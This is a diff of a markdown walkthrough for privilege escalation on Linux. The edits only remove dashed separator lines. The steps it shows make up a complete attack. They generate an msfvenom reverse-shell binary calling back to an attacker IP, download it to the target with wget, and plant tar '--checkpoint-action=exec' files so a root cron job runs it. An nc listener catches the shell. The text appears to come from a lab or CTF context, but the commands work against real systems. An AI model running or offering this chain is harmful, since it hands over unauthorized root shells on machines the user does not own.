@@ -9,26 +9,21 @@ All 3 must be true:
 3. You can write to the directory: `ls -ld /home/user`
 
 ## Exploitation Steps
---------------------------------
+
 ### 1. Create Reverse Shell
----------------------------------
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.114.112.67 LPORT=4444 -f elf -o shell.elf
 
------------------------------------
 ### 2. Upload and Make Executable
------------------------------------
 python3 -m http.server 8000  # on attacker machine
 wget http://10.114.112.67:8000/shell.elf  # on target
 chmod +x shell.elf
------------------------------------
+
 ### 3. Create the Exploit Files
-------------------------------------
 The `--` tells `tar` to treat these as options, not filenames.
 touch -- --checkpoint=1
 touch -- --checkpoint-action=exec=shell.elf
--------------------------
+
 ### 4. Listen and Wait
--------------------------
 nc -lvnp 4444
 Within 1 minute, cron will run and execute your shell as root.
 
